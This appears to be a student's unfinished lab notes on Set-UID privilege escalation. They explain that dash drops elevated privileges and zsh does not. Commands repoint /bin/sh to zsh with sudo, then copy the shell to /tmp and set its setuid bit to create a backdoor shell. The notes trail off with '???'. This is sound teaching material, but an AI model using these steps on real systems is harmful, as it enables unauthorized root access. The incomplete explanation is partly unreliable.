# Steal a shell

```bash
# default
ls -l /bin/sh
lrwxrwxrwx 1 root root 4 Jul 11  2022 /bin/sh -> dash
```

The `bin/sh` has a symlink to some mythical creature called `dash`.

## Things To Know

<question></question>
What is `dash`?

<answer></answer>
Besides another shell to haunt you, `dash` is the default system shell for executing system
scripts and other administrative tasks. `dash` has the countermeasure where if `euid!=ruid`, then
`euid` will be set equal to `ruid` which means lifted privilege will be automatically dropped.

<question></question>
Why is this important?

<answer></answer>
If the default shell is changed to another without the same countermeasure, bad actors can do bad
things! (need more research).

For example, `zsh` (yet another shell) does not have this countermeasure which is why it would be
a good choice of shell to use when attempting to stealing someones shell.

## Task: Steal Bobs Shell

#### Remove the symlink to the existing shell `dash` and create a new one to `zsh`

```bash
# remove symlink /bin/sh -> dash
sudo rm /bin/sh
# create symlink /bin/sh -> zsh
sudo ln -s /bin/zsh /bin/sh

```


#### Switch user and get to the steeling

```bash
# switch user
su bob

bob:x:1001:1001:,,,:/home/bob:/bin/bash

Type $id to check who is now the effective user.
```

<!--  -->

# copy your shell
cp /bin/sh /tmp/stolenShell
# elevate privileges by setting set-uid bit
chmod 4755 /tmp/stolenShell


Because we changed our default shell to zsh, this will create a copy of zsh instead of dash so
countermeasures are not in place


because the zsh has been copied the ???
